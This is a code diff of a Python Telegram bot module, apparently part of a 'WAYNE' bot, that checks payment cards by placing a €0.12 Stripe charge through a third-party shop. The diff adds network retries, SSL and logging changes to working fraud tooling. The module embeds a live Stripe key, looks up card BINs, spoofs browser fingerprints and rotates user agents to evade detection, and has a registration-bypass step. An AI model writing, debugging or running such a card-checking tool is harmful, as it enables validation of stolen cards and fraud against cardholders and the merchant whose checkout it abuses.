@@ -2,7 +2,7 @@
 # Stripe Charge €0.12 - Compatible with WAYNE Bot Structure
 # UI format matches stauth.py with proper permissions
 # CORRECTED: Uses universal charge processor - credits deducted AFTER check completes
-# FIXED: VPS Compatibility - Improved session initialization and network handling
+# FIXED FOR UBUNTU VPS: Added proper SSL, connection retries, timeout fixes
 
 import json
 import asyncio
@@ -11,12 +11,15 @@ import time
 import httpx
 import random
 import string
+import ssl
+import certifi
 from datetime import datetime
 from pyrogram import Client, filters
 from pyrogram.types import Message
 import html
-import ssl
-import certifi
+import os
+import sys
+import socket
 from BOT.helper.permissions import auth_and_free_restricted
 from BOT.helper.start import load_users, save_users
 
@@ -42,37 +45,37 @@ class EmojiLogger:
         pass
 
     def info(self, message):
-        print(f"🔹 {message}")
+        print(f"🔹 {message}", flush=True)
 
     def success(self, message):
-        print(f"✅ {message}")
+        print(f"✅ {message}", flush=True)
 
     def warning(self, message):
-        print(f"⚠️ {message}")
+        print(f"⚠️ {message}", flush=True)
 
     def error(self, message):
-        print(f"❌ {message}")
+        print(f"❌ {message}", flush=True)
 
     def step(self, step_num, total_steps, message):
-        print(f"🔸 [{step_num}/{total_steps}] {message}")
+        print(f"🔸 [{step_num}/{total_steps}] {message}", flush=True)
 
     def network(self, message):
-        print(f"🌐 {message}")
+        print(f"🌐 {message}", flush=True)
 
     def card(self, message):
-        print(f"💳 {message}")
+        print(f"💳 {message}", flush=True)
 
     def stripe(self, message):
-        print(f"🔄 {message}")
+        print(f"🔄 {message}", flush=True)
 
     def debug_response(self, message):
-        print(f"🔧 {message}")
+        print(f"🔧 {message}", flush=True)
 
     def bin_info(self, message):
-        print(f"🏦 {message}")
+        print(f"🏦 {message}", flush=True)
 
     def user(self, message):
-        print(f"👤 {message}")
+        print(f"👤 {message}", flush=True)
 
 # Create global logger instance
 logger = EmojiLogger()
@@ -82,7 +85,8 @@ def load_owner_id():
         with open("FILES/config.json", "r") as f:
             config_data = json.load(f)
             return config_data.get("OWNER")
-    except:
+    except Exception as e:
+        logger.error(f"Failed to load owner ID: {e}")
         return None
 
 def get_user_plan(user_id):
@@ -101,7 +105,8 @@ def is_user_banned(user_id):
             banned_users = f.read().splitlines()
 
         return str(user_id) in banned_users
-    except:
+    except Exception as e:
+        logger.error(f"Failed to check banned users: {e}")
         return False
 
 def check_cooldown(user_id, command_type="xx"):
@@ -116,7 +121,8 @@ def check_cooldown(user_id, command_type="xx"):
     try:
         with open("DATA/cooldowns.json", "r") as f:
             cooldowns = json.load(f)
-    except:
+    except Exception as e:
+        logger.warning(f"Failed to load cooldowns: {e}")
         cooldowns = {}
 
     user_key = f"{user_id}_{command_type}"
@@ -137,12 +143,10 @@ def check_cooldown(user_id, command_type="xx"):
     try:
         with open("DATA/cooldowns.json", "w") as f:
             json.dump(cooldowns, f, indent=4)
-    except:
-        pass
+    except Exception as e:
+        logger.error(f"Failed to save cooldowns: {e}")
 
     return True, 0
-
-import os
 
 class StripeCharge012Checker:
     def __init__(self):
@@ -163,9 +167,6 @@ class StripeCharge012Checker:
         self.last_bin_request = 0
         self.base_url = "https://bellobrick.com"
         self.stripe_key = "pk_live_51Gv2pCHrGjSxgNAlJ8eLnmjPrToBlChZFRgIpvGduYeqg66FzEJaQtLb4h2FOz193UH5RSoj6nUptqB5L7BRc9NR00VKfvfrsc"
-        
-        # VPS Compatibility: Added SSL context configuration
-        self.ssl_context = self.create_ssl_context()
 
         self.bin_services = [
             {
@@ -223,28 +224,15 @@ class StripeCharge012Checker:
 
         # Generate random browser fingerprints
         self.generate_browser_fingerprint()
-
-    def create_ssl_context(self):
-        """Create SSL context for VPS compatibility"""
+        
+        # SSL context for Ubuntu VPS compatibility - IMPORTANT FIX
         try:
-            # Try to use system certificates first
-            context = ssl.create_default_context()
-            context.check_hostname = False
-            context.verify_mode = ssl.CERT_NONE
-            return context
-        except:
-            # Fallback to certifi certificates
-            try:
-                context = ssl.create_default_context(cafile=certifi.where())
-                context.check_hostname = False
-                context.verify_mode = ssl.CERT_NONE
-                return context
-            except:
-                # Last resort: disable SSL verification (not recommended but works for VPS)
-                context = ssl.create_default_context()
-                context.check_hostname = False
-                context.verify_mode = ssl.CERT_NONE
-                return context
+            self.ssl_context = ssl.create_default_context(cafile=certifi.where())
+            self.ssl_context.check_hostname = True
+            self.ssl_context.verify_mode = ssl.CERT_REQUIRED
+        except Exception as e:
+            logger.warning(f"SSL context creation failed: {e}, using default")
+            self.ssl_context = None
 
     def generate_browser_fingerprint(self):
         """Generate realistic browser fingerprints to bypass detection"""
@@ -430,53 +418,69 @@ class StripeCharge012Checker:
             'emoji': '🏳️'
         }
 
-        try:
-            url = f"https://bins.antipublic.cc/bins/{bin_number}"
-            headers = {'User-Agent': self.user_agent}
+        # Try with retry logic for Ubuntu VPS
+        for attempt in range(3):
+            try:
+                url = f"https://bins.antipublic.cc/bins/{bin_number}"
+                headers = {'User-Agent': self.user_agent}
 
-            async with httpx.AsyncClient(
-                timeout=10.0,
-                verify=self.ssl_context,
-                follow_redirects=True
-            ) as client:
-                response = await client.get(url, headers=headers)
+                async with httpx.AsyncClient(
+                    timeout=15.0,
+                    verify=self.ssl_context if self.ssl_context else True,
+                    follow_redirects=True
+                ) as client:
+                    response = await client.get(url, headers=headers)
 
-                if response.status_code == 200:
-                    data = response.json()
-                    if "detail" in data and "not found" in data["detail"].lower():
-                        logger.warning(f"BIN {bin_number} not found in antipublic.cc")
-                    else:
-                        result = self.parse_antipublic(data)
-                        self.bin_cache[bin_number] = result
-                        return result
-        except Exception as e:
-            logger.warning(f"antipublic.cc failed: {e}")
-
-        for service in self.bin_services:
-            if service['name'] == 'binlist.net':
-                try:
-                    url = service['url'].format(bin=bin_number)
-                    headers = service['headers']
-
-                    async with httpx.AsyncClient(
-                        timeout=10.0,
-                        verify=self.ssl_context,
-                        follow_redirects=True
-                    ) as client:
-                        response = await client.get(url, headers=headers)
-
-                        if response.status_code == 200:
-                            data = response.json()
-                            result = service['parser'](data)
-
-                            if result['emoji'] == '🏳️' and result['country_code'] != 'N/A':
-                                result['emoji'] = self.get_country_emoji(result['country_code'])
-
+                    if response.status_code == 200:
+                        data = response.json()
+                        if "detail" in data and "not found" in data["detail"].lower():
+                            logger.warning(f"BIN {bin_number} not found in antipublic.cc")
+                        else:
+                            result = self.parse_antipublic(data)
                             self.bin_cache[bin_number] = result
                             return result
-                except Exception as e:
-                    logger.warning(f"binlist.net failed: {e}")
+                    else:
+                        logger.warning(f"Attempt {attempt+1}: antipublic.cc returned {response.status_code}")
+                        
+            except (ssl.SSLError, socket.gaierror) as e:
+                logger.error(f"SSL/DNS error attempt {attempt+1}: {e}")
+                if attempt < 2:
+                    await asyncio.sleep(2)
                     continue
+            except Exception as e:
+                logger.warning(f"antipublic.cc attempt {attempt+1} failed: {e}")
+                if attempt < 2:
+                    await asyncio.sleep(1)
+                    continue
+
+        # Fallback to binlist.net
+        for service in self.bin_services:
+            if service['name'] == 'binlist.net':
+                for attempt in range(2):
+                    try:
+                        url = service['url'].format(bin=bin_number)
+                        headers = service['headers']
+
+                        async with httpx.AsyncClient(
+                            timeout=10.0,
+                            verify=self.ssl_context if self.ssl_context else True
+                        ) as client:
+                            response = await client.get(url, headers=headers)
+
+                            if response.status_code == 200:
+                                data = response.json()
+                                result = service['parser'](data)
+
+                                if result['emoji'] == '🏳️' and result['country_code'] != 'N/A':
+                                    result['emoji'] = self.get_country_emoji(result['country_code'])
+
+                                self.bin_cache[bin_number] = result
+                                return result
+                    except Exception as e:
+                        logger.warning(f"binlist.net attempt {attempt+1} failed: {e}")
+                        if attempt < 1:
+                            await asyncio.sleep(1)
+                            continue
 
         self.bin_cache[bin_number] = default_response
         return default_response
@@ -601,7 +605,7 @@ class StripeCharge012Checker:
         await asyncio.sleep(delay)
 
     async def make_stealth_request(self, client, method, url, **kwargs):
-        """Make stealth request that mimics human behavior"""
+        """Make stealth request that mimics human behavior - FIXED FOR VPS"""
         await self.human_delay(0.5, 2.0)
 
         headers = kwargs.get('headers', {}).copy()
@@ -619,36 +623,45 @@ class StripeCharge012Checker:
             'Upgrade-Insecure-Requests': '1'
         })
         kwargs['headers'] = headers
+        
+        # Add timeout for VPS compatibility
+        if 'timeout' not in kwargs:
+            kwargs['timeout'] = 30.0
 
-        # VPS Compatibility: Set longer timeouts and retries
-        kwargs['timeout'] = kwargs.get('timeout', 30.0)
-
-        try:
-            response = await client.request(method, url, **kwargs)
-
-            if response.status_code == 403:
-                logger.warning(f"Got 403, retrying with different headers...")
-                new_headers = headers.copy()
-                new_headers['User-Agent'] = random.choice(self.user_agents)
-                kwargs['headers'] = new_headers
-
-                await self.human_delay(2, 4)
+        max_retries = 3
+        for attempt in range(max_retries):
+            try:
                 response = await client.request(method, url, **kwargs)
 
-            return response
-        except Exception as e:
-            logger.error(f"Request error: {str(e)}")
-            raise e
+                if response.status_code in [403, 429, 500, 502, 503, 504]:
+                    logger.warning(f"Got {response.status_code}, retrying {attempt+1}/{max_retries}...")
+                    if attempt < max_retries - 1:
+                        await asyncio.sleep(2 ** attempt)  # Exponential backoff
+                        headers['User-Agent'] = random.choice(self.user_agents)
+                        kwargs['headers'] = headers
+                        continue
+
+                return response
+            except (httpx.ConnectError, httpx.TimeoutException, ssl.SSLError, socket.gaierror) as e:
+                logger.error(f"Network error attempt {attempt+1}/{max_retries}: {e}")
+                if attempt < max_retries - 1:
+                    await asyncio.sleep(2 ** attempt)
+                    continue
+                raise e
+            except Exception as e:
+                logger.error(f"Request error: {str(e)}")
+                if attempt < max_retries - 1:
+                    await asyncio.sleep(2 ** attempt)
+                    continue
+                raise e
 
     async def initialize_session(self, client):
-        """Initialize session with proper cookies - IMPROVED FOR VPS"""
+        """Initialize session with proper cookies - FIXED FOR VPS"""
         try:
             logger.step(1, 8, "Initializing session...")
 
-            # Try multiple approaches for VPS compatibility
             for attempt in range(3):
                 try:
-                    # First try with SSL verification disabled
                     response = await self.make_stealth_request(
                         client, 'GET', f"{self.base_url}/"
                     )
@@ -657,26 +670,18 @@ class StripeCharge012Checker:
                         logger.success("Session initialized successfully")
                         return True
                     else:
-                        logger.warning(f"Attempt {attempt + 1}: Status {response.status_code}")
-                        
-                        # Try alternative URL if main fails
-                        if attempt == 1:
-                            response = await self.make_stealth_request(
-                                client, 'GET', f"{self.base_url}/shop/"
-                            )
-                            if response.status_code == 200:
-                                logger.success("Session initialized via shop page")
-                                return True
-                        
+                        logger.warning(f"Attempt {attempt+1}: Failed with status {response.status_code}")
                         if attempt < 2:
-                            await asyncio.sleep(2)  # Wait before retry
-                            
-                except Exception as e:
-                    logger.warning(f"Session init attempt {attempt + 1} failed: {str(e)[:100]}")
+                            await asyncio.sleep(2)
+                            continue
+                except (httpx.ConnectError, ssl.SSLError, socket.gaierror) as e:
+                    logger.error(f"Attempt {attempt+1}: Connection error: {e}")
                     if attempt < 2:
-                        await asyncio.sleep(2)  # Wait before retry
+                        await asyncio.sleep(3)
+                        continue
+                    raise
 
-            logger.error(f"Failed to initialize session after 3 attempts")
+            logger.error("All session initialization attempts failed")
             return False
 
         except Exception as e:
@@ -1031,33 +1036,24 @@ class StripeCharge012Checker:
                 "Referer": "https://js.stripe.com/",
             }
 
-            # VPS Compatibility: Use SSL context for Stripe API
-            stripe_client = httpx.AsyncClient(
-                timeout=30.0,
-                verify=self.ssl_context
-            )
-            
-            try:
-                response = await stripe_client.post("https://api.stripe.com/v1/payment_methods",
-                                             headers=stripe_headers, data=payment_data)
+            response = await client.post("https://api.stripe.com/v1/payment_methods",
+                                         headers=stripe_headers, data=payment_data, timeout=15.0)
 
-                if response.status_code == 200:
-                    result = response.json()
-                    payment_method_id = result.get('id')
-                    if payment_method_id:
-                        logger.success(f"Payment method created: {payment_method_id}")
-                        return {'success': True, 'payment_method_id': payment_method_id}
-                    else:
-                        return {'success': False, 'error': 'No payment method ID'}
+            if response.status_code == 200:
+                result = response.json()
+                payment_method_id = result.get('id')
+                if payment_method_id:
+                    logger.success(f"Payment method created: {payment_method_id}")
+                    return {'success': True, 'payment_method_id': payment_method_id}
                 else:
-                    try:
-                        error_data = response.json()
-                        error_msg = error_data.get('error', {}).get('message', 'Payment method creation failed')
-                        return {'success': False, 'error': error_msg}
-                    except:
-                        return {'success': False, 'error': 'Stripe API error'}
-            finally:
-                await stripe_client.aclose()
+                    return {'success': False, 'error': 'No payment method ID'}
+            else:
+                try:
+                    error_data = response.json()
+                    error_msg = error_data.get('error', {}).get('message', 'Payment method creation failed')
+                    return {'success': False, 'error': error_msg}
+                except:
+                    return {'success': False, 'error': 'Stripe API error'}
 
         except Exception as e:
             return {'success': False, 'error': f"Payment method error: {str(e)}"}
@@ -1170,7 +1166,7 @@ class StripeCharge012Checker:
             }
 
     async def check_card(self, card_details, username, user_data):
-        """Main card checking method - IMPROVED FOR VPS"""
+        """Main card checking method - FIXED FOR VPS"""
         start_time = time.time()
         logger.info(f"🔍 Starting Stripe Charge €0.12 check: {card_details[:12]}XXXX{card_details[-4:] if len(card_details) > 4 else ''}")
 
@@ -1223,25 +1219,38 @@ class StripeCharge012Checker:
 
             logger.user(f"User: {first_name} {last_name} | {email} | {phone}")
 
-            # VPS Compatibility: Configure HTTP client with proper SSL and longer timeouts
-            async with httpx.AsyncClient(
-                timeout=45.0,  # Increased timeout for VPS
-                follow_redirects=True,
-                limits=httpx.Limits(max_keepalive_connections=5, max_connections=10),
-                http2=True,
-                verify=self.ssl_context,  # Use custom SSL context
-                headers=self.get_base_headers()  # Add base headers
-            ) as client:
+            # Create client with VPS-specific settings
+            client_kwargs = {
+                'timeout': 45.0,
+                'follow_redirects': True,
+                'limits': httpx.Limits(max_keepalive_connections=5, max_connections=10),
+            }
+            
+            # Add SSL context if available
+            if self.ssl_context:
+                client_kwargs['verify'] = self.ssl_context
+            
+            # Try HTTP/2, fallback to HTTP/1.1
+            try:
+                client_kwargs['http2'] = True
+            except:
+                pass
 
-                # Initialize session with retries
-                for attempt in range(2):
-                    if await self.initialize_session(client):
-                        break
-                    elif attempt == 0:
-                        logger.warning("First session init failed, retrying...")
-                        await asyncio.sleep(3)
-                    else:
-                        return await self.format_response(cc, mes, ano, cvv, "DECLINED", "Failed to initialize session (VPS Network Issue)", username, time.time()-start_time, user_data, bin_info)
+            async with httpx.AsyncClient(**client_kwargs) as client:
+
+                # Try session initialization with retries
+                max_init_attempts = 3
+                for attempt in range(max_init_attempts):
+                    try:
+                        if await self.initialize_session(client):
+                            break
+                        elif attempt == max_init_attempts - 1:
+                            return await self.format_response(cc, mes, ano, cvv, "DECLINED", "Failed to initialize session after multiple attempts", username, time.time()-start_time, user_data, bin_info)
+                    except Exception as e:
+                        logger.error(f"Session init attempt {attempt+1} failed: {e}")
+                        if attempt == max_init_attempts - 1:
+                            return await self.format_response(cc, mes, ano, cvv, "DECLINED", f"Session initialization error: {str(e)[:80]}", username, time.time()-start_time, user_data, bin_info)
+                        await asyncio.sleep(2)
 
                 bypass_success, error = await self.bypass_registration(client, user_info)
                 if not bypass_success:
@@ -1276,10 +1285,13 @@ class StripeCharge012Checker:
 
         except httpx.TimeoutException:
             logger.error("Request timeout")
-            return await self.format_response(cc, mes, ano, cvv, "ERROR", "Request timeout (VPS)", username, time.time()-start_time, user_data, bin_info)
-        except httpx.ConnectError:
-            logger.error("Connection error")
-            return await self.format_response(cc, mes, ano, cvv, "ERROR", "Connection failed (VPS Network)", username, time.time()-start_time, user_data, bin_info)
+            return await self.format_response(cc, mes, ano, cvv, "ERROR", "Request timeout", username, time.time()-start_time, user_data, bin_info)
+        except (httpx.ConnectError, socket.gaierror) as e:
+            logger.error(f"Connection error: {e}")
+            return await self.format_response(cc, mes, ano, cvv, "ERROR", "Connection failed", username, time.time()-start_time, user_data, bin_info)
+        except ssl.SSLError as e:
+            logger.error(f"SSL error: {e}")
+            return await self.format_response(cc, mes, ano, cvv, "ERROR", "SSL certificate error", username, time.time()-start_time, user_data, bin_info)
         except Exception as e:
             logger.error(f"Unexpected error: {str(e)}")
             return await self.format_response(cc, mes, ano, cvv, "ERROR", f"System error: {str(e)[:80]}", username, time.time()-start_time, user_data, bin_info)
@@ -1407,11 +1419,25 @@ async def handle_stripe_charge_012(client: Client, message: Message):
             await processing_msg.edit_text(result, disable_web_page_preview=True)
         else:
             # Fallback to old method if charge_processor not available
-            result = await checker.check_card(card_details, username, user_data)
-            await processing_msg.edit_text(result, disable_web_page_preview=True)
+            try:
+                result = await checker.check_card(card_details, username, user_data)
+                await processing_msg.edit_text(result, disable_web_page_preview=True)
+            except Exception as e:
+                logger.error(f"Card check error: {e}")
+                await processing_msg.edit_text(f"""<b>「$cmd → /xx」| <b>WAYNE</b> </b>
+━━━━━━━━━━━━━━━
+<b>[•] Card-</b> <code>{cc}|{mes}|{ano}|{cvv}</code>
+<b>[•] Gateway -</b> Stripe Charge €0.12
+<b>[•] Status-</b> ❌ ERROR
+<b>[•] Response-</b> <code>VPS Connection Failed: {str(e)[:100]}</code>
+━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
+<b>⚠️ Please check VPS network connectivity</b>
+<b>⚠️ Ensure SSL certificates are installed</b>
+━━━━━━━━━━━━━━━""", disable_web_page_preview=True)
 
     except Exception as e:
         error_msg = str(e)[:150]
+        logger.error(f"Command handler error: {e}")
         await message.reply(f"""<pre>❌ Command Error</pre>
 ━━━━━━━━━━━━━
 ⟐ <b>Message</b>: An error occurred while processing your request.
